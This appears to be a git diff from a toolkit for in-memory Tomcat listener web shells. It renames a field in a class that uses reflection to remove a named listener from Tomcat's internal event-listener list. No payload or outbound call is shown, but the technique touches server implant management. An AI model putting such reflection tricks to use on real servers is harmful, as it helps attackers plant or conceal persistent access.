@@ -11,7 +11,7 @@ import java.util.List;
  * Tomcat 8 9
  */
 public class UnloadTomcatListenerContextClassMS {
-    private static String NAME = "TomcatListenerContextClassMS";
+    private static String CLASSNAME = "TomcatListenerContextClassMS";
 
     public UnloadTomcatListenerContextClassMS() {
 
@@ -35,7 +35,7 @@ public class UnloadTomcatListenerContextClassMS {
             }
             List<Object> applicationEventListeners = (List<Object>) getFieldValue(standardContext, "applicationEventListenersList");
             for (Object applicationEventListener : applicationEventListeners) {
-                if (applicationEventListener.getClass().getName().contains(NAME)) {
+                if (applicationEventListener.getClass().getName().contains(CLASSNAME)) {
                     applicationEventListeners.remove(applicationEventListener);
                     break;
                 }
